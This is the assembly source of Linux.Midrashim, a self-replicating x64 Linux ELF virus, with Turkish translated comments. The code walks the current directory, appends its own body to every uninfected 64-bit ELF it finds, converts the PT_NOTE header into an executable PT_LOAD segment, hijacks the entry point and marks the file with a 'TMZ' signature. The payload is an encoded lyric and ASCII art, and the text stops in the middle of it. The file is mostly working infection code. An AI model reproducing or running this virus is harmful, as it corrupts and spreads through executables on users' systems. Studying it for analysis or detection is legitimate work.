; Linux.Midrashim
; TMZ tarafından yazıldı
; [ Çeviri @batcain tarafından yapılmıştır ]
; Bitirilme zamanı: 30.05.2020
; Yayınlanma zamanı: 07.11.2020
; Yayınlamamı geciktirdim çünkü 90'lar tarzında bir payload üzerinde çalışıyordum zaman darlığından dolayı bunu başka bir projeye bırakıyorum.
; Bu benim tamamen assembly kullanılarak yazılmış ilk virüsüm ve fasm x64 ile derlemeniz gerekiyor. (1.73.25 sürümünde test ettim fakat yenilerinde de çalışması gerek.)
;   - PT_NOTE -> PT_LOAD enfeksiyon tekniğine dayalı ve x64 normal ELF çalıştırabilir dosyalarında çalışıyor olması lazım. (PIE olup olmaması mühim değil.)
;   - mmap kullanmam gerekirdi ama pread ve pwrite kullanıyorum (tembelliğimden dolayı).
;   - bir şeyleri saklamak için bellek kullanıyor (r15 register'ı)
;   - mevcut dizini enfekte eder (özyineleme yapmaz).
;   - bazı parçaları daha fazla geliştirilmeliydi, örneğin virus'ün ilk çalıştırılma anını tespiti daha iyi bir yaklaşım olurdu.
; 
; Derlemeyi şu şekilde yapabilirsin:
;       $ fasm Linux.Midrashim.asm
;
; Payload (zararsız) bir şarkıdan alıntıdır ve encode edilmesinin özel bir sebebi yoktur.
; 
; VX sahnesini hayatta tutanlara şükranlarımı sunuyorum!
; E-mail atmaktan çekinmeyin; tmz@null.net || tmz@syscall.sh || thomazi@linux.com
; @guitmz || @TMZvx
; https://www.guitmz.com
; https://syscall.sh
;
; Kullanımı kendi sorumluluğunuzdadır, bunun neden olabileceği zararlardan sorumlu değilim, vahşi doğaya dağıtmayın! (vahşi doğa(in-the-wild): kontrol edilmesi zor veya edilemeyen teknolojik ortamlar)
;
; Referanslar:
; https://www.guitmz.com/linux-midrashim-elf-virus/
; https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf
; https://www.wikidata.org/wiki/Q6041496
; https://legacyofkain.fandom.com/wiki/Ozar_Midrashim
; https://en.wikipedia.org/wiki/Don%27t_Be_Afraid_(album)
;
; Stack buffer:
; r15 + 0 = stack buffer (10000 bytes) = stat
; r15 + 48 = stat.st_size
; r15 + 144 = ehdr
; r15 + 148 = ehdr.class
; r15 + 152 = ehdr.pad
; r15 + 168 = ehdr.entry
; r15 + 176 = ehdr.phoff
; r15 + 198 = ehdr.phentsize
; r15 + 200 = ehdr.phnum
; r15 + 208 = phdr = phdr.type
; r15 + 212 = phdr.flags
; r15 + 216 = phdr.offset
; r15 + 224 = phdr.vaddr
; r15 + 232 = phdr.paddr
; r15 + 240 = phdr.filesz
; r15 + 248 = phdr.memsz
; r15 + 256 = phdr.align
; r15 + 300 = jmp rel
; r15 + 350 = directory size
; r15 + 400 = dirent = dirent.d_ino
; r15 + 416 = dirent.d_reclen
; r15 + 418 = dirent.d_type
; r15 + 419 = dirent.d_name
; r15 + 3000 = first run control flag
; r15 + 3001 = decoded payload

format ELF64 executable 3

SYS_EXIT        = 60
SYS_OPEN        = 2
SYS_CLOSE       = 3
SYS_WRITE       = 1
SYS_READ        = 0
SYS_EXECVE      = 59
SYS_GETDENTS64  = 217
SYS_FSTAT       = 5
SYS_LSEEK       = 8
SYS_PREAD64     = 17
SYS_PWRITE64    = 18
SYS_SYNC        = 162
STDOUT          = 1
EHDR_SIZE       = 64
ELFCLASS64      = 2
O_RDONLY        = 0
O_RDWR          = 2
SEEK_END        = 2
DIRENT_BUFSIZE  = 1024
MFD_CLOEXEC     = 1
DT_REG          = 8
PT_LOAD         = 1
PT_NOTE         = 4
PF_X            = 1
PF_R            = 4
FIRST_RUN       = 1
V_SIZE          = 2631

segment readable executable
entry v_start

v_start:
    mov r14, [rsp + 8]                                          ; argv0'ı r14'e at
    push rdx
    push rsp
    sub rsp, 5000                                               ; 5000 byte yer ayır
    mov r15, rsp                                                ; r15 stack buffer adresini tutuyor

    check_first_run:
        mov rdi,  r14                                           ; argv0'ı rdi'ya geçir
        mov rsi, O_RDONLY
        xor rdx, rdx                                            ; open çağrısında 'flags' parametresini sıfırla
        mov rax, SYS_OPEN
        syscall                                                 ; rax argv0'ın file descriptor'unu tutuyor. 

        mov rdi, rax
        mov rsi, r15                                            ; rsi = r15 = stack buffer adresi
        mov rax, SYS_FSTAT                                      ; argv0'ın büyüklüğünü byte şeklinde al
        syscall                                                 ; stat.st_size = [r15 + 48]
        
        cmp qword [r15 + 48], V_SIZE                            ; argv0'ın boyutunu virus'ün büyüklüğü ile karşılaştır
        jg load_dir                                             ; eğer büyükse, ilk çağrım değil, kontrol flag'ını ayarlamadan devam et
        
        mov byte [r15 + 3000], FIRST_RUN                        ; ilk çağrışı ayırt edebilmek için kontrol flag'ini [r15 + 3000] olarak ayarla. çok iyi bir yaklaşım değil ama iş görür.

    load_dir:
        push "."                                                ; '.' karakterini stack'in başına koy 
        mov rdi, rsp                                            ; "." karakterini rdi'ya taşı
        mov rsi, O_RDONLY
        xor rdx, rdx                                            ; open çağrısında 'flags' parametresini sıfırla
        mov rax, SYS_OPEN
        syscall                                                 ; file descriptor'u rax değerine dönecek.
        
        pop rdi
        cmp rax, 0                                              ; eğer dosyayı açamadıysa çıkış yap.
        jbe v_stop

        mov rdi, rax                                            ; fd'yi rdi'ye taşı
        lea rsi, [r15 + 400]                                    ; rsi = dirent = [r15 + 400]
        mov rdx, DIRENT_BUFSIZE                                 ; maksimum dizin büyüklüğünde buffer
        mov rax, SYS_GETDENTS64
        syscall                                                 ; dirent dizin girdilerini içeriyor.

        test rax, rax                                           ; dizin listelemesi başarılı olup olmadığını kontrol et.
        js v_stop                                               ; eğer dönüş negatif ise başarısız oldu ve çıkış yap 

        mov qword [r15 + 350], rax                              ; [r15 + 350] adresi dizinin büyüklüğünü tutuyor

        mov rax, SYS_CLOSE                                      ; açılmış dosyanın file descriptor'unu kapa, (yukarıda rax'taki fd rdi'ye alınmıştı)
        syscall

        xor rcx, rcx                                            ; dizin girdilerinin pozisyonu olarak kullanılacak.

    file_loop:
        push rcx                                                ; rcx'i muhafaza et (önemli!!!)
        cmp byte [rcx + r15 + 418], DT_REG                      ; sıradan bir dosya olup olmadığını kontrol et. (dirent.d_type = [r15 + 418])
        jne .continue                                           ; eğer değilse diğer dosyalara devam et.

        .open_target_file:
            lea rdi, [rcx + r15 + 419]                          ; dirent.d_name = [r15 + 419]
            mov rsi, O_RDWR
            xor rdx, rdx                                        ; open çağrısında 'flags' parametresini sıfırla
            mov rax, SYS_OPEN
            syscall

            cmp rax, 0                                          ; dosya açılmıyorsa programdan çık. 
            jbe .continue
            mov r9, rax                                         ; r9 register'ı şu anda hedef file descriptor'u taşıyor.

        .read_ehdr:
            mov rdi, r9                                         ; r9'daki hedef file descriptor'u rdi'ye ata
            lea rsi, [r15 + 144]                                ; rsi = ehdr = [r15 + 144]
            mov rdx, EHDR_SIZE                                  ; ehdr.size
            mov r10, 0                                          ; okumaya sıfırdan başla
            mov rax, SYS_PREAD64
            syscall

        .is_elf:
            cmp dword [r15 + 144], 0x464c457f                   ; 0x464c457f == ".ELF" (little-endian hali)
            jnz .close_file                                     ; eğer ".ELF" ile başlamıyorsa(bu demekki ELF dosyası değil),dosyayı kapat ve diğerlerine devam et
        
        .is_64:
            cmp byte [r15 + 148], ELFCLASS64                    ; Hedef ELF dosyası 64 bit olup olmadığını kontrol et.
            jne .close_file                                     ; eğer değilse pas geç

        .is_infected:
            cmp dword [r15 + 152], 0x005a4d54                   ; ehdr.pad'in imzasını kontrol et([r15+152]'de olacak)(little-endian halinde "TMZ", "word" boyutunda olabilsin diye takibinde sıfır barındırıyor)
            jz .close_file                                      ; zaten enfekte edilmiş durumda, dosyayı kapat ve diğerlerine devam et.

            mov r8, [r15 + 176]                                 ; şu anda r8 register'ı ehdr.phoff'u içeriyor (o da burada [r15 + 176])
            xor rbx, rbx                                        ; rbx'e phdr döngüsünün sayacını ayarla.
            xor r14, r14                                        ; r14 register'ı phdr dosya ofset'ini tutuyor olacak.

        .loop_phdr:
            mov rdi, r9                                         ; r9 register'ına file descriptor'u ayarla
            lea rsi, [r15 + 208]                                ; rsi = phdr = [r15 + 208]
            mov dx, word [r15 + 198]                            ; ehdr.phentsize [r15 + 198] adresinde
            mov r10, r8                                         ; ehdr.phoff'u r8 register'ından oku (her döngü yinelemesinde ehdr.fontsize'ı arttır)
            mov rax, SYS_PREAD64
            syscall

            cmp byte [r15 + 208], PT_NOTE                       ; phdr.type'ın PT_NOTE (4) olup olmadığını kontrol et([r15 + 208] adresinde)
            jz .infect                                          ; eğer öyleyse, piyangoyu vurduk demek, enfekte etmeye başla

            inc rbx                                             ; eğer değilse, rbx sayıcını arttır 
            cmp bx, word [r15 + 200]                            ; bütün phdr'ları gezip gezmediğimizi kontrol et (ehdr.phnum = [r15 + 200])
            jge .close_file                                     ; eğer enfekte edebilmek için doğru phdr bulunamadıysa çık

            add r8w, word [r15 + 198]                           ; tam tersi durum var ise, şu andaki ehdr.phentsize ile r8w'i topla (ehdr.phentsize [r15 + 198] adresinde.)
            jnz .loop_phdr                                      ; sonraki phdr'ı oku

        .infect:
            .get_target_phdr_file_offset:
                mov ax, bx                                      ; phdr döngü sayacını bx'ten ax'e ata
                mov dx, word [r15 + 198]                        ; ehdr.phentsize'ı dx'e ata.(ehdr.phentsize [r15 + 198] adresinde)
                imul dx                                         ; bx * ehdr.phentsize
                mov r14w, ax
                add r14, [r15 + 176]                            ; r14 = ehdr.phoff + (bx * ehdr.phentsize)

            .file_info:
                mov rdi, r9
                mov rsi, r15                                    ; rsi = r15 = stack buffer adresi
                mov rax, SYS_FSTAT
                syscall                                         ; stat.st_size = [r15 + 48]

            .append_virus:
                ; hedef dosya sonunu al
                mov rdi, r9                                     ; r9 file descriptor'u barındırıyor
                mov rsi, 0                                      ; ofset'i 0 olarak ayarla. 
                mov rdx, SEEK_END
                mov rax, SYS_LSEEK
                syscall                                         ; hedef dosya sonu ofset'i rax'a atanacak.
                push rax                                        ; hedef dosya sonu ofset'ini stack'te sakla

                call .delta                                     ; yıllanmış eski bir numara
                .delta:
                    pop rbp
                    sub rbp, .delta

                ; virüsün kendisini dosya sonuna yazdır
                mov rdi, r9                                     ; r9 file descriptor'u barındırıyor
                lea rsi, [rbp + v_start]                        ; v_start'ın adresini rsi register'ına taşı 
                mov rdx, v_stop - v_start                       ; virüsün boyutu
                mov r10, rax                                    ; rax hedef dosya sonunu taşıyor(önceki syscall'dan elde edilmişti)
                mov rax, SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

            .patch_phdr:
                mov dword [r15 + 208], PT_LOAD                  ; phdr tipini PT_NOTE'dan PT_LOAD (1)'e çevir (phdr tipi [r15 + 208] adresinde)
                mov dword [r15 + 212], PF_R or PF_X             ; phdr.flags'i PF_X(1)| PF_R(4)'e ayarla (phdr.flags [r15 + 212] adresinde.)
                pop rax                                         ; hedef dosya sonunu stack'ten rax'a çıkart.
                mov [r15 + 216], rax                            ; phdr.offset [r15 + 216] = hedef dosya sonu ofseti
                mov r13, [r15 + 48]                             ; hedef stat.st_size'ı r13 register'ına geçir. (stat.st_size [r15 + 48] adresinde)
                add r13, 0xc000000                              ; hedef dosya boyutuna 0xc000000 ekle
                mov [r15 + 224], r13                            ; phdr.vaddr'ı yenisiyle(r13 register'ında) değiştir. (phdr.vaddr [r15 + 224] adresinde) (stat.st_size + 0xc000000)
                mov qword [r15 + 256], 0x200000                 ; phdr.align'ı 2MB'ye ayarla. (phdr.align [r15 + 256] adresinde)
                add qword [r15 + 240], v_stop - v_start + 5     ; virüsün boyutunu phdr.filesz'a ekle(phdr.filesz [r15 + 240] adresinde) (+5 eklenmesinin sebebi ehdr.entry'deki "jmp" için)
                add qword [r15 + 248], v_stop - v_start + 5     ; virüsün boyutunu phdr.memsz'a ekle (phdr.memsz [r15 + 248] adresinde) (+5 eklenmesinin sebebi ehdr.entry'deki "jmp" için)

                ; güncellemiş phdr'ı yaz
                mov rdi, r9                                     ; r9 file descriptor'u barındırıyor
                mov rsi, r15                                    ; rsi = r15 = stack buffer adresi
                lea rsi, [r15 + 208]                            ; rsi = phdr = [r15 + 208]
                mov dx, word [r15 + 198]                        ; ehdr.phentsize [r15 + 198] adresinde
                mov r10, r14                                    ; phdr [r15 + 208] adresinde
                mov rax, SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

            .patch_ehdr:
                ; ehdr'ı güncelle
                mov r14, [r15 + 168]                            ; orjinal ehdr.entry'i r14 register'ında sakla (ehdr.entry [r15 + 168] adresinde)
                mov [r15 + 168], r13                            ; [r15 + 168] adresindeki ehdr.entry'e r13 register'ındaki değeri ayarla (phdr.vaddr)
                mov r13, 0x005a4d54                             ; r13 rsegister'ına virüs imzasını yükle("TMZ" kelimesinin little-endian hali)
                mov [r15 + 152], r13                            ; virüün imzasını ehdr.pad'e ekle (ehdr.pad [r15 + 152] adresinde)

                ; güncellenmiş ehdr'ı yaz
                mov rdi, r9                                     ; r9 file descriptor'u barındırıyor
                lea rsi, [r15 + 144]                            ; rsi = ehdr = [r15 + 144]
                mov rdx, EHDR_SIZE                              ; ehdr.size
                mov r10, 0                                      ; ehdr.offset
                mov rax, SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

            .write_patched_jmp:
                ; yeni dosya sonunu al
                mov rdi, r9                                     ; r9 file descriptor'u barındırıyor
                mov rsi, 0                                      ; lseek ofset'i sıfırı göstersin
                mov rdx, SEEK_END
                mov rax, SYS_LSEEK
                syscall                                         ; hedef dosya sonu ofset'ini rax'a ayarla

                ; güncellenmiş jmp'ı yaratma adımları
                mov rdx, [r15 + 224]                            ; rdx = phdr.vaddr
                add rdx, 5
                sub r14, rdx
                sub r14, v_stop - v_start
                mov byte [r15 + 300 ], 0xe9
                mov dword [r15 + 301], r14d

                ; writing patched jmp to EOF
                mov rdi, r9                                     ; r9 file descriptor'u barındırıyor
                lea rsi, [r15 + 300]                            ; rsi = stack buffer'ındaki güncellenmiş "jmp"  = [r15 + 208]
                mov rdx, 5                                      ; "jmp rel" boyutu 
                mov r10, rax                                    ; rax register'ındaki değeri r10 register'ına taşı (taşınan değer yeni dosya sonu)
                mov rax, SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

                mov rax, SYS_SYNC                               ; değişiklikleri dosya sistemi önbelleğinden disk'e geçir
                syscall

        .close_file:
            mov rax, SYS_CLOSE                                  ; kaynak file descriptor'unu kapat (fd rdi register'ında yer alıyor)
            syscall

        .continue:
            pop rcx
            add cx, word [rcx + r15 + 416]                      ; dizin kaydı boyutunu cx'e ata (rcx değerini "word" boyutu için düşür)
            cmp rcx, qword [r15 + 350]                          ; rcx sayacını toplam dizin kayıt büyüklüğü ile karşılaştır 
            jne file_loop                                       ; sayaç aynı değilse döngüye devam et, aynıysa virüsten çık

    cmp byte [r15 + 3000], FIRST_RUN                            ; virüsün ilk kez çalışıp çalışmadığını belirten kontrol 'flag' değerini kontrol et
    jnz infected_run                                            ; flag 1'e eşit değilse enfekte olmuş bir dosyadan çalışıyor demek, normal payload kullanılacak
        call show_msg                                           ; flag 1'e eşitse virüs ilk kez çalıştırılıyor demek, ekrana farklı bir mesaj yazdır.
        info_msg:
            db 'Midrashim by TMZ (c) 2020', 0xa                 ; en iyi yol olmadığını önceden de söylemiştim ama uygulaması kolay bir yöntem.
            info_len = $-info_msg
        show_msg:            
            pop rsi                                             ; info_msg adresini rsi register'ına ata
            mov rax, SYS_WRITE
            mov rdi, STDOUT                                     ; payload'u göster
            mov rdx, info_len
            syscall
            jmp cleanup                                         ; temizle ve çık

    infected_run:
        ; 1337 encoded payload, very hax0r
        call payload
        msg:
            ; payload first part
            db 0x59, 0x7c, 0x95, 0x95, 0x57, 0x9e, 0x9d, 0x57
            db 0xa3, 0x9f, 0x92, 0x57, 0x93, 0x9e, 0xa8, 0xa3
            db 0x96, 0x9d, 0x98, 0x92, 0x57, 0x7e, 0x57, 0x98
            db 0x96, 0x9d, 0x57, 0xa8, 0x92, 0x92, 0x57, 0x96
            db 0x57, 0x9f, 0xa2, 0x94, 0x92, 0x57, 0x9f, 0x9c
            db 0x9b, 0x9c, 0x94, 0xa9, 0x96, 0xa7, 0x9f, 0x9e
            db 0x98, 0x57, 0x89, 0x9c, 0x9d, 0x96, 0x9b, 0x93
            db 0x57, 0x7a, 0x98, 0x73, 0x9c, 0x9d, 0x96, 0x9b
            db 0x93, 0x57, 0xa4, 0x96, 0x9b, 0xa0, 0x9e, 0x9d
            db 0x94, 0x57, 0x99, 0x92, 0xa3, 0xa4, 0x92, 0x92
            db 0x9d, 0x57, 0xa3, 0x9f, 0x92, 0x57, 0x94, 0xa9
            db 0x96, 0x9e, 0x9d, 0x57, 0x92, 0x9b, 0x92, 0xa5
            db 0x96, 0xa3, 0x9c, 0xa9, 0xa8, 0x57, 0x96, 0x9d
            db 0x93, 0x57, 0xa3, 0xa9, 0x92, 0x92, 0xa8, 0x41
            db 0x7c, 0x9f, 0x5b, 0x57, 0x9e, 0x95, 0x57, 0x7e
            db 0x57, 0x9f, 0x96, 0x93, 0x57, 0xa3, 0x9f, 0x92
            db 0x57, 0x9a, 0x9c, 0x9d, 0x92, 0xae, 0x57, 0x7e
            db 0x54, 0x93, 0x57, 0x9f, 0x96, 0xa5, 0x92, 0x57
            db 0x54, 0x92, 0x9a, 0x57, 0x9a, 0x96, 0xa0, 0x92
            db 0x57, 0x9c, 0x9d, 0x92, 0x57, 0x9c, 0x95, 0x57
            db 0xa3, 0x9f, 0x9c, 0xa8, 0x92, 0x57, 0x9a, 0x92
            db 0x5b, 0x57, 0xa3, 0x9f, 0x92, 0x9d, 0x57, 0x7e
            db 0x54, 0x93, 0x57, 0xa8, 0x92, 0x9d, 0x93, 0x57
            db 0x9a, 0xae, 0xa8, 0x92, 0x9b, 0x95, 0x57, 0xa3
            db 0x9c, 0x57, 0xa8, 0xa3, 0x96, 0x9b, 0xa0, 0x57
            db 0xa3, 0x9f, 0x92, 0x57, 0x9b, 0x96, 0x9d, 0x93
            db 0xa8, 0x98, 0x96, 0xa7, 0x92, 0x57, 0x96, 0x9d
            db 0x93, 0x57, 0xa8, 0x98, 0x96, 0xa9, 0x92, 0x57
            db 0x92, 0xa5, 0x92, 0xa9, 0xae, 0x99, 0x9c, 0x93
            db 0xae, 0x41, 0x8e, 0x9c, 0xa2, 0x57, 0xa8, 0x92
            db 0x92, 0x5b, 0x57, 0x54, 0x98, 0x96, 0xa2, 0xa8
            db 0x92, 0x57, 0x7e, 0x57, 0x94, 0x9c, 0xa3, 0x57
            db 0xa3, 0x9f, 0x9e, 0xa8, 0x57, 0xa8, 0x9c, 0xa9
            db 0xa3, 0x57, 0x9c, 0x95, 0x57, 0x95, 0x9e, 0x92
            db 0x9b, 0x93, 0x57, 0x99, 0x92, 0x9f, 0x9e, 0x9d
            db 0x93, 0x57, 0x9a, 0x92, 0x5d, 0x57, 0x79, 0x92
            db 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x5d, 0x5d, 0x5d
            db 0x57, 0x54, 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x57
            db 0x7e, 0x54, 0xa5, 0x92, 0x57, 0x94, 0x9c, 0xa3
            db 0x57, 0xa8, 0xa7, 0x9e, 0xa0, 0x92, 0xa8, 0x41
            db 0x79, 0x92, 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x57
            db 0x7e, 0x57, 0x94, 0x9c, 0x57, 0x99, 0x92, 0xa3
            db 0xa4, 0x92, 0x92, 0x9d, 0x57, 0xa3, 0x9f, 0x92
            db 0x57, 0xb1, 0x9c, 0x9d, 0x92, 0xa8, 0x5b, 0x57
            db 0x92, 0xa5, 0x92, 0x9d, 0x57, 0xa4, 0x9f, 0x92
            db 0x9d, 0x57, 0x7e, 0x54, 0x9a, 0x57, 0x9d, 0x9c
            db 0xa3, 0x57, 0xa8, 0xa2, 0xa7, 0xa7, 0x9c, 0xa8
            db 0x92, 0x93, 0x57, 0xa3, 0x9c, 0x41, 0x79, 0x92
            db 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x57, 0x7e, 0x54
            db 0x9a, 0x57, 0x96, 0x57, 0xa8, 0xa2, 0xa8, 0xa7
            db 0x9e, 0x98, 0x9e, 0x9c, 0xa2, 0xa8, 0x57, 0xa7
            db 0x92, 0xa9, 0xa8, 0x9c, 0x9d, 0x57, 0xa9, 0x92
            db 0xa7, 0x9c, 0xa9, 0xa3, 0x57, 0x41, 0x76, 0x9d
            db 0x93, 0x57, 0x9e, 0xa3, 0x54, 0xa8, 0x57, 0xa3
            db 0x9e, 0x9a, 0x92, 0x57, 0xa3, 0x9c, 0x57, 0x94
            db 0x9c, 0x57, 0xa8, 0x9f, 0x9c, 0xa7, 0xa7, 0x9e
            db 0x9d, 0x94, 0x5d, 0x59, 0x41, 0x37, 0x41
            ; payload'un ikinci kısmı
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x55
            db 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x58
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
            db 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x57, 0x55
            db 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
            db 0x55, 0x55, 0x58, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
            db 0x55, 0x55, 0x5d, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x52, 0x55, 0x55, 0x55, 0x55, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x55
            db 0x55, 0x55, 0x55, 0x5d, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x5d
            db 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x55, 0x55, 0x55, 0x55, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
            db 0x55, 0x55, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55
            db 0x55, 0x55, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
            db 0x57, 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x55
            db 0x55, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x57, 0x55
            db 0x55, 0x55, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x57, 0x55
            db 0x55, 0x55, 0x52, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x61, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x57, 0x55
            db 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x57, 0x55
            db 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
